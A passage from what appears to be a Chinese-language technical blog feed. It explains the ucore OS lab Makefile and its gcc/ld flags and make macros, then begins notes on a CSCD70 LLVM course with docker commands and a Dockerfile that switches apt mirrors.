class="hljs-keyword">fi</span>)<br>endi<br></code></pre></div></td></tr></table></figure><ul><li>接下来的部分定义了各种编译命令以及编译选项，其中-fno-stack-protector编译选项的确定也使用了与上文确定GCCPREFIX相似的技巧，巧妙地利用了linux bash中 &amp;&amp; 连接起来的两条指令，如果第一条指令出错，则第二条指令不会执行的特点，来确认当前的gcc是否允许使用 -fno-stack-protector这一编译选项；</li><li>该段Makefile代码中所设计的所有gcc编译选项和链接器ld选项的作用分别如下：<ul><li>-g：在编译中加入调试信息，便于之后使用gdb进行调试；</li><li>-Wall：使能所有编译警告，便于发现潜在的错误；</li><li>-O2: 开启O2编译优化；</li><li>-fno-builtin: 不承认所有不是以<strong>builtin</strong>为开头的内建函数；</li><li>-ggdb 产生gdb所需要的调试信息（与-g的区别是ggdb的调试信息是专门为gdb而生成的）；</li><li>-m32: 32位模式；</li><li>-gstabs：以stabs格式输出调试信息，不包括gdb拓展；</li><li>-nostdinc: 不搜索默认路径头文件；</li><li>-fno-stack-protector: 禁用堆栈保护;</li><li>-nostdlib: 该链接器选项表示不链接任何系统标准启动文件和标准库文件，这是因为编译操作系统内核和bootloader是不需要这些启动文件和库就应该能够执行的；</li></ul></li><li>其他涉及到的bash命令选项为：<ul><li>mkdir -p: 允许创建嵌套子目录；</li><li>touch -c: 不创建已经存在的文件；</li><li>rm -f: 无视任何确认提示；</li></ul></li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># eliminate default suffix rules</span><br><span class="hljs-section">.SUFFIXES: .c .S .h</span><br><br><span class="hljs-comment"># delete target files if there is an error (or make is interrupted)</span><br><span class="hljs-section">.DELETE_ON_ERROR:</span><br><br><span class="hljs-comment"># define compiler and flags</span><br><span class="hljs-keyword">ifndef</span>  USELLVM<br>HOSTCC      := gcc<br>HOSTCFLAGS  := -g -Wall -O2<br>CC      := <span class="hljs-variable">$(GCCPREFIX)</span>gcc<br>CFLAGS  := -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc <span class="hljs-variable">$(DEFS)</span><br>CFLAGS  += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span><br><span class="hljs-keyword">else</span><br>HOSTCC      := clang<br>HOSTCFLAGS  := -g -Wall -O2<br>CC      := clang<br>CFLAGS  := -fno-builtin -Wall -g -m32 -mno-sse -nostdinc <span class="hljs-variable">$(DEFS)</span><br>CFLAGS  += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span><br><span class="hljs-keyword">endif</span><br><br>CTYPE   := c S<br><br>LD      := <span class="hljs-variable">$(GCCPREFIX)</span>ld<br>LDFLAGS := -m <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(LD)</span> -V | grep elf_i386 2&gt;/dev/null)</span><br>LDFLAGS += -nostdlib<br><br>OBJCOPY := <span class="hljs-variable">$(GCCPREFIX)</span>objcopy<br>OBJDUMP := <span class="hljs-variable">$(GCCPREFIX)</span>objdump<br><br>COPY    := cp<br>MKDIR   := mkdir -p<br>MV      := mv<br>RM      := rm -f<br>AWK     := awk<br>SED     := sed<br>SH      := sh<br>TR      := tr<br>TOUCH   := touch -c<br><br>OBJDIR  := obj<br>BINDIR  := bin<br><br>ALLOBJS :=<br>ALLDEPS :=<br>TARGETS :=<br></code></pre></div></td></tr></table></figure><ul><li>接下来的部分引用了tools/function.mk文件，因此不仿分析该文件的内容如下：</li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># list all files in some directories: (#directories, #types)</span><br>listf = <span class="hljs-variable">$(<span class="hljs-built_in">filter</span> $(<span class="hljs-built_in">if</span> $(2)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> %.,$(2)</span>),%),\<br>          <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> $(<span class="hljs-built_in">addsuffix</span> <span class="hljs-variable">$(SLASH)</span>*,$(1)</span>))<br></code></pre></div></td></tr></table></figure><p>上述定义了一个获取某一个目录下的所有某类型文件的表达式，该表达式可以使用call函数调用来使用，其中<code>$(if $(2),$(addprefix %.,$(2)),%)</code>部分是用于构造一个<code>%.</code>某后缀形式的pattern，<code>$(wildcard $(addsuffix $(SLASH)*,$(1))</code>部分则是被是用来获取当前目录下的而所有文件，并且使用filter函数过滤出这所有文件中具有.$(2) (即call传入的第二个参数)后缀的文件；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># get .o obj files: (#files[, packet])</span><br>toobj = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(OBJDIR)</span><span class="hljs-variable">$(SLASH)</span>$(<span class="hljs-built_in">if</span> $(2)</span>,$(2)<span class="hljs-variable">$(SLASH)</span>),\<br>        <span class="hljs-variable">$(<span class="hljs-built_in">addsuffix</span> .o,$(<span class="hljs-built_in">basename</span> $(1)</span>))<br></code></pre></div></td></tr></table></figure><p>该表达式表示将传入的文件名列表中的所有后缀修改为.o，并且将其添加上这些.o文件的目录，获取到这些.o文件最终应该存放的位置；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># get .d dependency files: (#files[, packet])</span><br>todep = <span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> %.o,%.d,$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(2))<br></code></pre></div></td></tr></table></figure><p>将所有.o文件的后缀名修改为.d;</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">totarget = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(BINDIR)</span><span class="hljs-variable">$(SLASH)</span>,$(1)</span>)<br></code></pre></div></td></tr></table></figure><p>获取由第一个参数传入的binary文件最终应当存放的位置；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># change $(name) to $(OBJPREFIX)$(name): (#names)</span><br>packetname = <span class="hljs-variable">$(<span class="hljs-built_in">if</span> $(1)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(OBJPREFIX)</span>,$(1)</span>),<span class="hljs-variable">$(OBJPREFIX)</span><br></code></pre></div></td></tr></table></figure><p>给第一个参数传入的所有文件名加上$(OBJPREFIX)前缀；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># cc compile template, generate rule for dep, obj: (file, cc[, flags, dir])</span><br><span class="hljs-keyword">define</span> cc_template<br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> todep,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -MM $<span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$$(patsubst %.d,%.o,$<span class="hljs-variable">$@</span>) $<span class="hljs-variable">$@</span>&quot;</span>&gt; $<span class="hljs-variable">$@</span><br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @echo + cc $<span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c $<span class="hljs-variable">$&lt;</span> -o $<span class="hljs-variable">$@</span><br>ALLOBJS += $<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4))<br>ende<br></code></pre></div></td></tr></table></figure><p>这部分使用define多行定义了一个编译的模板(对单个文件进行编译成object文件)，其中若干处$$表示原本的字符$，这是因为后文中将对这个部分执行eval，而$$&lt;即原本的$&lt;表示了依赖目标的值，$@表示了目标的值, 在本部分中，将最终生成出目标文件的依赖文件，以及定义了生成目标文件的规则;</p><p><strong>更具体一点，该模板的前半部分是用于生成Makefile .d依赖文件（利用gcc的-MM选项），后半部分则是使用gcc编译出.o文件, 并且将所有.o文件加入到ALLOBJS变量中；</strong> </p><p><strong>关于上述代码中的$(V)的使用</strong>，发现原本<code>V</code>变量定义的是@, 也就是不在shell中输出的符号, 如果在make命令行中overide the definition of V, 也就是使用<code>V=</code>赋值为空, 那么<code>$(V)</code>后面的命令就会被输出.</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-keyword">define</span> do_cc_compile<br>$<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(4))))<br>ende<br></code></pre></div></td></tr></table></figure><p>表示将传入的文件列表中的每一个文件都使用cc_template进行生成编译模板；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add files to packet: (#files, cc[, flags, packet, dir])</span><br><span class="hljs-keyword">define</span> do_add_files_to_packet<br>__temp_packet__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> packetname,$(4)</span>)<br><span class="hljs-keyword">ifeq</span> ($<span class="hljs-variable">$(<span class="hljs-built_in">origin</span> $<span class="hljs-variable">$(__temp_packet__)</span>)</span>,undefined)<br>$<span class="hljs-variable">$(__temp_packet__)</span> :=<br><span class="hljs-keyword">endif</span><br>__temp_objs__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(5))<br>$<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(5))))<br>$<span class="hljs-variable">$(__temp_packet__)</span> += $<span class="hljs-variable">$(__temp_objs__)</span><br>ende<br></code></pre></div></td></tr></table></figure><p>上述代码中，首先使用call packetname生成出某一个packetname对应的makefile中变量的名字，然后使用origin查询这个变量是否已经定义过，如果为定义，则初始化该变量为空；之后使用toobj生成出该packet中所需要的生成的.o文件的文件名列表，然后将其添加到以__temp_packet__这个变量中所存的值作为名字的变量中去，并且使用cc_template生成出该packet生成.d文件和.o文件的代码；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add objs to packet: (#objs, packet)</span><br><span class="hljs-keyword">define</span> do_add_objs_to_packet<br>__temp_packet__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> packetname,$(2)</span>)<br><span class="hljs-keyword">ifeq</span> ($<span class="hljs-variable">$(<span class="hljs-built_in">origin</span> $<span class="hljs-variable">$(__temp_packet__)</span>)</span>,undefined)<br>$<span class="hljs-variable">$(__temp_packet__)</span> :=<br><span class="hljs-keyword">endif</span><br>$<span class="hljs-variable">$(__temp_packet__)</span> += $(1)<br>ende<br></code></pre></div></td></tr></table></figure><p>上述代码表示将某一个.o文件添加到某一个packet对应的makefile中的变量中的文件列表中去；举例，如果要添加a.o到pack这一个packet中，则结果就是__objs_这个变量会执行__objs_pack += a.o这个一个操作；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add packets and objs to target (target, #packes, #objs[, cc, flags])</span><br><span class="hljs-keyword">define</span> do_create_target<br>__temp_target__ = <span class="hljs-variable">$(<span class="hljs-built_in">call</span> totarget,$(1)</span>)<br>__temp_objs__ = $<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> p,$(<span class="hljs-built_in">call</span> packetname,$(2)</span>),$$($<span class="hljs-variable">$(p)</span>)) $(3)<br>TARGETS += $<span class="hljs-variable">$(__temp_target__)</span><br><span class="hljs-keyword">ifneq</span> ($(4),)<br><span class="hljs-section">$$(__temp_target__): $<span class="hljs-variable">$(__temp_objs__)</span> | $$$$(dir $$$<span class="hljs-variable">$@</span>)</span><br>    <span class="hljs-variable">$(V)</span>$(4) $(5) $<span class="hljs-variable">$^</span> -o $<span class="hljs-variable">$@</span><br><span class="hljs-keyword">else</span><br><span class="hljs-section">$$(__temp_target__): $<span class="hljs-variable">$(__temp_objs__)</span> | $$$$(dir $$$<span class="hljs-variable">$@</span>)</span><br><span class="hljs-keyword">endif</span><br>ende<br></code></pre></div></td></tr></table></figure><p>上述代码表示将第一个参数传入的binary targets和第三个参数传入的object文件均添加到TARGETS变量中去，之后根据第4个参数是否传入gcc编译命令来确定是否生成编译的规则；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># finish all</span><br><span class="hljs-keyword">define</span> do_finish_all<br>ALLDEPS = $$(ALLOBJS:.o=.d)<br>$<span class="hljs-variable">$(<span class="hljs-built_in">sort</span> $$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$(ALLOBJS)</span>)</span> <span class="hljs-variable">$(BINDIR)</span><span class="hljs-variable">$(SLASH)</span> <span class="hljs-variable">$(OBJDIR)</span><span class="hljs-variable">$(SLASH)</span>):<br>    @<span class="hljs-variable">$(MKDIR)</span> $<span class="hljs-variable">$@</span><br>ende<br></code></pre></div></td></tr></table></figure><p>创建编译过程中所需要的子目录；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># --------------------  function end  --------------------</span><br><span class="hljs-comment"># compile file: (#files, cc[, flags, dir])</span><br>cc_compile = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_cc_compile,$(1)</span>,$(2),$(3),$(4)))<br><br><span class="hljs-comment"># add files to packet: (#files, cc[, flags, packet, dir])</span><br>add_files = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_add_files_to_packet,$(1)</span>,$(2),$(3),$(4),$(5)))<br><br><span class="hljs-comment"># add objs to packet: (#objs, packet)</span><br>add_objs = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_add_objs_to_packet,$(1)</span>,$(2)))<br><br><span class="hljs-comment"># add packets and objs to target (target, #packes, #objs, cc, [, flags])</span><br>create_target = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_create_target,$(1)</span>,$(2),$(3),$(4),$(5)))<br><br>read_packet = <span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> p,$(<span class="hljs-built_in">call</span> packetname,$(1)</span>),$(<span class="hljs-variable">$(p)</span>))<br><br>add_dependency = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(1)</span>: $(2))<br><br>finish_all = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_finish_all)</span><br></code></pre></div></td></tr></table></figure><p>接下来这部分则是使用eval来进一步将原先设计好的编译代码的表达式中的变量替换为变量的数值，从而方便后面生成编译的规则，接下来不妨以cc_compile这个表达式的求值为例，说明Makefile中是如何生成编译规则的：</p><blockquote><p>为了方便起见，不妨假设传入cc_compile这个表达式的四个参数分别为main.c, gcc, -Wall, bin, 则不妨首先计算<code>$(call do_cc_compile,$(1),$(2),$(3),$(4))</code>表达式的数值如下：</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">cc_compile  <br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_cc_compile,$(1)</span>,$(2),$(3),$(4))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(4))))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">foreach</span> f, $(1)</span>, <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> cc_template, <span class="hljs-variable">$(f)</span>, $(2)</span>, $(3), $(4)))))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> cc_template, $(1)</span>, $(2), $(3), $(4)))) (since $(1)=main.c)<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">eval</span> </span><br><span class="hljs-variable">$$(<span class="hljs-built_in">call</span> todep,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -MM $<span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$$(patsubst %.d,%.o,$<span class="hljs-variable">$@</span>) $<span class="hljs-variable">$@</span>&quot;</span>&gt; $<span class="hljs-variable">$@</span><br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @echo + cc $<span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c $<span class="hljs-variable">$&lt;</span> -o $<span class="hljs-variable">$@</span><br>ALLOBJS += $<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)<br>))<br>= <span class="hljs-variable">$(<span class="hljs-built_in">eval</span></span><br><span class="hljs-variable">$(<span class="hljs-built_in">call</span> todep, $(1)</span>, $(4))): $(1) | $$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>)  $(3) -MM <span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$(patsubst %.d,%.o,<span class="hljs-variable">$@</span>) <span class="hljs-variable">$@</span>&quot;</span>&gt; <span class="hljs-variable">$@</span><br><span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @echo + cc <span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c <span class="hljs-variable">$&lt;</span> -o <span class="hljs-variable">$@</span><br>ALLOBJS += <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4))<br>)<br>= <span class="hljs-variable">$(<span class="hljs-built_in">eval</span></span><br><span class="hljs-variable">obj/main.d: main.c | $$$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @gcc -I./ -Wall -MM main.c -MT <span class="hljs-string">&quot;main.o main.d&quot;</span>&gt; main.d<br><span class="hljs-section">obj/main.o: main.c | $$$(dir $<span class="hljs-variable">$@</span>)</span><br>    @echo + cc main.c<br>    <span class="hljs-variable">$(V)</span>gcc -I./ -Wall -c main.c -o main.o<br>)<br><span class="hljs-comment"># 注意到还有一次expansion, 是因为 .SECONDEXPANSION: 这个built-in target</span><br>=<br><span class="hljs-section">obj/main.d: main.c | obj</span><br>    @gcc -I./ -Wall -MM main.c -MT <span class="hljs-string">&quot;main.o main.d&quot;</span>&gt; main.d <br><span class="hljs-section">obj/main.o: main.c | obj</span><br>    @echo + cc main.c<br>    <span class="hljs-variable">$(V)</span>gcc -I./ -Wall -c main.c -o main.o<br></code></pre></div></td></tr></table></figure><p>至此通过例子演示了如果使用Makefile来生成一系列编译规则，如果使用<code>make --trace</code>(所有输出)或者<code>make -n</code>(Don’t actually run any recipe; just print them.)，可以发现生成obj/boot/bootasm.d, obj/boot/bootasm.o的实际执行的命令为</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -MM boot/bootmain.c -MT &quot;obj/boot/bootmain.o obj/boot/bootmain.d&quot;&gt; obj/boot/bootmain.d<br>和:<br>gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o<br></code></pre></div></td></tr></table></figure><p>，与上述例子中展开的结果进行对比，可以确认该分析过程的正确性；</p><ul><li>其余Makefile命令均用于生成<code>.PHONY</code>目标来完成clean，grade等一系列功能，与具体生成ucore.img过程无关，因此在本报告中将不太对其进行分析；</li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSCD70 &amp;&amp; LLVM</title>
    <link href="/2022-03/Now-CSCD70/"/>
    <url>/2022-03/Now-CSCD70/</url>
    
    <content type="html"><![CDATA[<h1 id="docker相关"><a href="#docker相关" class="headerlink" title="docker相关"></a>docker相关</h1><blockquote><p>docker原理待看, 主要是chroot+namespace的使用, 所以只能在linux中运行. Windows必须装上WSL.</p></blockquote><ul><li>开启container</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd ~/Desktop/CSCD70/<br>sudo docker run -it -v $(pwd):/mnt --rm --name cscd70_a1 cscd70:2021S<br></code></pre></div></td></tr></table></figure><ul><li>多开container: </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo docker exec -it <br>sudo docker exec -it &#123;container_ID&#125; /bin/bash <br><span class="hljs-meta">#</span><span class="bash"> 一长串的是container ID, 可以直接看容器用户名, 或者使用`sudo docker ps`</span><br></code></pre></div></td></tr></table></figure><ul><li>具体创建方法在Assignment0里面, 我还为此换了个阿里源… 下面是dockerfile新加上的部分.</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse&quot;</span> &gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse&quot;</span> 